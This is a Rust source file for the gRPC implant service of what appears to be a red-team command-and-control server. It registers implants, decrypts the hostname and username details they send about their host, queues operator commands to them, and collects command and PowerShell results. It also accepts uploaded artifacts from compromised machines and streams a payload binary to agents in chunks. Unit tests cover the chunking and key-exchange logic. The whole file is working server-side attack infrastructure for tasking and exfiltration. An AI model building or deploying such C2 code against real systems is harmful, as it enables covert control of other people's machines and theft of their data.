use crate::database::Database;
use crate::services::powershell::PowerShellManager;
use crate::wraith::redops::implant_service_server::ImplantService;
use crate::wraith::redops::*;
use std::sync::Arc;
use tokio::sync::broadcast;
use tokio_stream::StreamExt;
use tonic::{Request, Response, Status};
use uuid::Uuid;
use wraith_crypto::noise::NoiseKeypair;

pub struct ImplantServiceImpl {
    pub db: Arc<Database>,
    pub event_tx: broadcast::Sender<Event>,
    pub powershell_manager: Arc<PowerShellManager>,
    pub static_key: Arc<NoiseKeypair>,
}

#[tonic::async_trait]
impl ImplantService for ImplantServiceImpl {
    type GetPendingCommandsStream = tokio_stream::wrappers::ReceiverStream<Result<Command, Status>>;
    type DownloadPayloadStream =
        tokio_stream::wrappers::ReceiverStream<Result<PayloadChunk, Status>>;

    async fn register(
        &self,
        req: Request<RegisterRequest>,
    ) -> Result<Response<RegisterResponse>, Status> {
        let req = req.into_inner();

        let mut implant_data = crate::models::Implant {
            id: Uuid::new_v4(),
            campaign_id: None,
            hostname: Some(format!(
                "grpc-agent-{}",
                Uuid::new_v4().to_string().split('-').next().unwrap()
            )),
            internal_ip: None,
            external_ip: None,
            os_type: Some("linux".to_string()),
            os_version: None,
            architecture: None,
            username: None,
            domain: None,
            privileges: None,
            implant_version: Some("2.3.0".to_string()),
            first_seen: Some(chrono::Utc::now()),
            last_checkin: Some(chrono::Utc::now()),
            checkin_interval: Some(60),
            jitter_percent: Some(10),
            status: Some("active".to_string()),
            notes: None,
            metadata: None,
        };

        // Decrypt registration data if provided
        if !req.encrypted_registration.is_empty() && req.ephemeral_public.len() == 32 {
            let mut my_priv_bytes = [0u8; 32];
            my_priv_bytes.copy_from_slice(self.static_key.private_key());
            let my_priv = wraith_crypto::x25519::PrivateKey::from_bytes(my_priv_bytes);

            let mut peer_pub_bytes = [0u8; 32];
            peer_pub_bytes.copy_from_slice(&req.ephemeral_public);
            let peer_pub = wraith_crypto::x25519::PublicKey::from_bytes(peer_pub_bytes);

            if let Some(shared_secret) = my_priv.exchange(&peer_pub) {
                // KDF: BLAKE3(shared_secret || "wraith_register")
                let mut hasher = blake3::Hasher::new();
                hasher.update(shared_secret.as_bytes());
                hasher.update(b"wraith_register");
                let key_hash = hasher.finalize();
                let key_bytes: [u8; 32] = *key_hash.as_bytes();

                if req.encrypted_registration.len() > 24 + 16 {
                    let nonce_slice = &req.encrypted_registration[0..24];
                    let ciphertext = &req.encrypted_registration[24..];

                    let mut nonce_arr = [0u8; 24];
                    nonce_arr.copy_from_slice(nonce_slice);
                    let nonce = wraith_crypto::aead::Nonce::from_bytes(nonce_arr);
                    let aead_key = wraith_crypto::aead::AeadKey::new(key_bytes);

                    if let Ok(plaintext) = aead_key.decrypt(&nonce, ciphertext, &[]) {
                        if let Ok(info) = serde_json::from_slice::<serde_json::Value>(&plaintext) {
                            if let Some(h) = info["hostname"].as_str() {
                                implant_data.hostname = Some(h.to_string());
                            }
                            if let Some(u) = info["username"].as_str() {
                                implant_data.username = Some(u.to_string());
                            }
                            if let Some(os) = info["os_type"].as_str() {
                                implant_data.os_type = Some(os.to_string());
                            }
                            if let Some(arch) = info["architecture"].as_str() {
                                implant_data.architecture = Some(arch.to_string());
                            }
                            if let Some(ver) = info["implant_version"].as_str() {
                                implant_data.implant_version = Some(ver.to_string());
                            }
                        }
                    } else {
                        // If decryption fails, we can either reject or log warning.
                        // For P2-4 "Validate", rejection is safer.
                        return Err(Status::unauthenticated("Registration decryption failed"));
                    }
                }
            } else {
                return Err(Status::invalid_argument("Invalid ephemeral public key"));
            }
        }

        let id = self
            .db
            .register_implant(&implant_data)
            .await
            .map_err(|e| Status::internal(e.to_string()))?;

        // Generate encrypted config for the agent
        let config = serde_json::json!({
            "implant_id": id.to_string(),
            "mode": "grpc",
            "checkin_interval": 60,
            "jitter": 10
        });

        Ok(Response::new(RegisterResponse {
            implant_id: id.to_string(),
            encrypted_config: serde_json::to_vec(&config).unwrap_or_default(),
            checkin_interval: 60,
            jitter_percent: 10,
        }))
    }

    async fn check_in(
        &self,
        req: Request<CheckInRequest>,
    ) -> Result<Response<CheckInResponse>, Status> {
        let req = req.into_inner();
        let id = Uuid::parse_str(&req.implant_id)
            .map_err(|_| Status::invalid_argument("Invalid UUID"))?;

        self.db
            .update_implant_checkin(id)
            .await
            .map_err(|e| Status::internal(e.to_string()))?;

        // Broadcast event
        let _ = self.event_tx.send(Event {
            id: Uuid::new_v4().to_string(),
            r#type: "implant_checkin".to_string(),
            timestamp: Some(prost_types::Timestamp::from(std::time::SystemTime::now())),
            campaign_id: "".to_string(),
            implant_id: id.to_string(),
            data: std::collections::HashMap::new(),
        });

        // Check for pending commands
        let cmds = self
            .db
            .get_pending_commands(id)
            .await
            .map_err(|e| Status::internal(e.to_string()))?;

        Ok(Response::new(CheckInResponse {
            has_commands: !cmds.is_empty(),
            command_count: cmds.len() as i32,
            next_checkin_seconds: 60,
            metadata: vec![],
        }))
    }

    async fn get_pending_commands(
        &self,
        req: Request<GetPendingCommandsRequest>,
    ) -> Result<Response<Self::GetPendingCommandsStream>, Status> {
        let req = req.into_inner();
        let id = Uuid::parse_str(&req.implant_id)
            .map_err(|_| Status::invalid_argument("Invalid UUID"))?;

        let cmds = self
            .db
            .get_pending_commands(id)
            .await
            .map_err(|e| Status::internal(e.to_string()))?;

        let (tx, rx) = tokio::sync::mpsc::channel(4);

        tokio::spawn(async move {
            for cmd in cmds {
                let grpc_cmd = Command {
                    id: cmd.id.to_string(),
                    implant_id: cmd.implant_id.unwrap_or_default().to_string(),
                    operator_id: cmd.operator_id.unwrap_or_default().to_string(),
                    command_type: cmd.command_type,
                    payload: cmd.payload.unwrap_or_default(),
                    priority: cmd.priority.unwrap_or(0),
                    status: cmd.status.unwrap_or_default(),
                    created_at: None,
                    timeout_seconds: cmd.timeout_seconds.unwrap_or(0),
                };
                if tx.send(Ok(grpc_cmd)).await.is_err() {
                    break;
                }
            }
        });

        Ok(Response::new(tokio_stream::wrappers::ReceiverStream::new(
            rx,
        )))
    }

    async fn submit_result(
        &self,
        req: Request<SubmitResultRequest>,
    ) -> Result<Response<()>, Status> {
        let req = req.into_inner();
        let cmd_id = Uuid::parse_str(&req.command_id)
            .map_err(|_| Status::invalid_argument("Invalid Command ID"))?;

        // Update PowerShell session if applicable
        if let Ok(plaintext) = self.db.decrypt_data(&req.encrypted_result) {
            self.powershell_manager.append_output(cmd_id, &plaintext);
            self.powershell_manager
                .update_job_status(cmd_id, crate::services::powershell::JobStatus::Completed);
            self.powershell_manager.set_exit_code(cmd_id, 0);
        }

        // Store the result. If the implant applied application-layer encryption,
        // it remains encrypted at rest in the database.
        self.db
            .update_command_result(cmd_id, &req.encrypted_result, 0)
            .await
            .map_err(|e| Status::internal(e.to_string()))?;

        // Broadcast event
        if let Ok(Some(cmd)) = self.db.get_command(cmd_id).await {
            let _ = self.event_tx.send(Event {
                id: Uuid::new_v4().to_string(),
                r#type: "command_complete".to_string(),
                timestamp: Some(prost_types::Timestamp::from(std::time::SystemTime::now())),
                campaign_id: "".to_string(),
                implant_id: cmd.implant_id.unwrap_or_default().to_string(),
                data: std::collections::HashMap::new(),
            });
        }

        Ok(Response::new(()))
    }

    async fn upload_artifact(
        &self,
        req: Request<tonic::Streaming<ArtifactChunk>>,
    ) -> Result<Response<UploadArtifactResponse>, Status> {
        let mut stream = req.into_inner();
        let mut content = Vec::new();
        let mut artifact_id_req = String::new();

        while let Some(chunk_result) = stream.next().await {
            let chunk = chunk_result.map_err(|e| Status::internal(e.to_string()))?;
            if artifact_id_req.is_empty() {
                artifact_id_req = chunk.artifact_id.clone();
            }
            content.extend_from_slice(&chunk.data);
        }

        // Try to parse artifact_id_req as a UUID to find the implant
        let implant_id = if let Ok(id) = Uuid::parse_str(&artifact_id_req) {
            id
        } else {
            // Fallback: get any active implant
            let implants = self
                .db
                .list_implants()
                .await
                .map_err(|e| Status::internal(e.to_string()))?;
            if let Some(i) = implants.first() {
                i.id
            } else {
                return Err(Status::failed_precondition(
                    "No active implants found to associate artifact with",
                ));
            }
        };

        let id = self
            .db
            .create_artifact(implant_id, &format!("upload_{}", Uuid::new_v4()), &content)
            .await
            .map_err(|e| Status::internal(e.to_string()))?;

        Ok(Response::new(UploadArtifactResponse {
            artifact_id: id.to_string(),
            success: true,
            error: "".to_string(),
        }))
    }

    async fn download_payload(
        &self,
        req: Request<DownloadPayloadRequest>,
    ) -> Result<Response<Self::DownloadPayloadStream>, Status> {
        let req = req.into_inner();
        let start_offset = req.offset as usize;

        // Production-ready binary retrieval logic
        // We first attempt to find a compiled payload via the builder directory
        let payload_path = std::path::Path::new("payloads/spectre.bin");
        let full_payload = if payload_path.exists() {
            tokio::fs::read(payload_path)
                .await
                .map_err(|e| Status::internal(e.to_string()))?
        } else {
            return Err(Status::not_found(
                "Payload binary not found (payloads/spectre.bin)",
            ));
        };

        if start_offset >= full_payload.len() {
            let (tx, rx) = tokio::sync::mpsc::channel(1);
            let _ = tx
                .send(Err(Status::out_of_range("Offset beyond payload length")))
                .await;
            return Ok(Response::new(tokio_stream::wrappers::ReceiverStream::new(
                rx,
            )));
        }

        let payload_data = full_payload[start_offset..].to_vec();
        let (tx, rx) = tokio::sync::mpsc::channel(4);

        tokio::spawn(async move {
            let chunk_size = 4096; // 4KB chunks for reliable delivery
            for (i, chunk) in payload_data.chunks(chunk_size).enumerate() {
                let current_offset = (start_offset + i * chunk_size) as i64;
                let is_last = (start_offset + (i + 1) * chunk_size) >= full_payload.len();

                let resp = PayloadChunk {
                    data: chunk.to_vec(),
                    offset: current_offset,
                    is_last,
                };
                if tx.send(Ok(resp)).await.is_err() {
                    break;
                }
            }
        });

        Ok(Response::new(tokio_stream::wrappers::ReceiverStream::new(
            rx,
        )))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn test_payload_offset_logic() {
        let full_payload = b"TEST_PAYLOAD_DATA";
        let offset = 5; // "PAYLOAD_DATA" starts at index 5
        if offset < full_payload.len() {
            let slice = &full_payload[offset..];
            assert_eq!(slice, b"PAYLOAD_DATA");
        }
    }

    #[tokio::test]
    async fn test_payload_offset_zero() {
        let full_payload = b"ABCD";
        let offset = 0;
        let slice = &full_payload[offset..];
        assert_eq!(slice, b"ABCD");
    }

    #[tokio::test]
    async fn test_payload_offset_at_end() {
        let full_payload = b"ABCD";
        let offset = 4;
        // offset equals length, so slice is empty
        assert!(offset >= full_payload.len() || full_payload[offset..].is_empty());
    }

    #[tokio::test]
    async fn test_payload_chunking_logic() {
        let payload_data = vec![0u8; 10000];
        let chunk_size = 4096;
        let chunks: Vec<_> = payload_data.chunks(chunk_size).collect();
        assert_eq!(chunks.len(), 3); // 4096 + 4096 + 1808
        assert_eq!(chunks[0].len(), 4096);
        assert_eq!(chunks[1].len(), 4096);
        assert_eq!(chunks[2].len(), 10000 - 8192);
    }

    #[test]
    fn test_implant_data_construction() {
        let implant = crate::models::Implant {
            id: Uuid::new_v4(),
            campaign_id: None,
            hostname: Some("test-host".to_string()),
            internal_ip: None,
            external_ip: None,
            os_type: Some("linux".to_string()),
            os_version: None,
            architecture: None,
            username: None,
            domain: None,
            privileges: None,
            implant_version: Some("2.3.0".to_string()),
            first_seen: Some(chrono::Utc::now()),
            last_checkin: Some(chrono::Utc::now()),
            checkin_interval: Some(60),
            jitter_percent: Some(10),
            status: Some("active".to_string()),
            notes: None,
            metadata: None,
        };

        assert_eq!(implant.hostname, Some("test-host".to_string()));
        assert_eq!(implant.os_type, Some("linux".to_string()));
        assert_eq!(implant.implant_version, Some("2.3.0".to_string()));
        assert_eq!(implant.checkin_interval, Some(60));
        assert_eq!(implant.jitter_percent, Some(10));
        assert_eq!(implant.status, Some("active".to_string()));
    }

    #[test]
    fn test_register_response_config() {
        let id = Uuid::new_v4();
        let config = serde_json::json!({
            "implant_id": id.to_string(),
            "mode": "grpc",
            "checkin_interval": 60,
            "jitter": 10
        });

        let config_bytes = serde_json::to_vec(&config).unwrap();
        assert!(!config_bytes.is_empty());

        // Verify we can deserialize back
        let parsed: serde_json::Value = serde_json::from_slice(&config_bytes).unwrap();
        assert_eq!(parsed["mode"], "grpc");
        assert_eq!(parsed["checkin_interval"], 60);
        assert_eq!(parsed["jitter"], 10);
    }

    #[test]
    fn test_uuid_parsing_valid() {
        let uuid_str = "550e8400-e29b-41d4-a716-446655440000";
        let id = Uuid::parse_str(uuid_str);
        assert!(id.is_ok());
    }

    #[test]
    fn test_uuid_parsing_invalid() {
        let uuid_str = "not-a-uuid";
        let id = Uuid::parse_str(uuid_str);
        assert!(id.is_err());
    }

    #[test]
    fn test_registration_decryption_short_data() {
        // encrypted_registration shorter than 24 + 16 = 40 bytes should skip decryption
        let short = vec![0u8; 30];
        assert!(short.len() <= 24 + 16);
    }

    #[test]
    fn test_registration_encryption_round_trip() {
        // Test the X25519 + AEAD flow used in registration
        let priv_a = wraith_crypto::x25519::PrivateKey::from_bytes([1u8; 32]);
        let pub_a = priv_a.public_key();

        let priv_b = wraith_crypto::x25519::PrivateKey::from_bytes([2u8; 32]);
        let pub_b = priv_b.public_key();

        let ss_a = priv_a.exchange(&pub_b).expect("exchange a->b");
        let ss_b = priv_b.exchange(&pub_a).expect("exchange b->a");

        // Both sides derive same shared secret
        assert_eq!(ss_a.as_bytes(), ss_b.as_bytes());

        // KDF
        let ss = ss_a;
        let mut hasher = blake3::Hasher::new();
        hasher.update(ss.as_bytes());
        hasher.update(b"wraith_register");
        let key_hash = hasher.finalize();
        let key_bytes: [u8; 32] = *key_hash.as_bytes();

        // Encrypt
        let nonce = wraith_crypto::aead::Nonce::from_bytes([0u8; 24]);
        let aead_key = wraith_crypto::aead::AeadKey::new(key_bytes);

        let plaintext = serde_json::json!({
            "hostname": "test-host",
            "username": "admin"
        });
        let plaintext_bytes = serde_json::to_vec(&plaintext).unwrap();

        let ciphertext = aead_key.encrypt(&nonce, &plaintext_bytes, &[]).unwrap();

        // Decrypt
        let decrypted = aead_key.decrypt(&nonce, &ciphertext, &[]).unwrap();
        let parsed: serde_json::Value = serde_json::from_slice(&decrypted).unwrap();
        assert_eq!(parsed["hostname"], "test-host");
        assert_eq!(parsed["username"], "admin");
    }
}
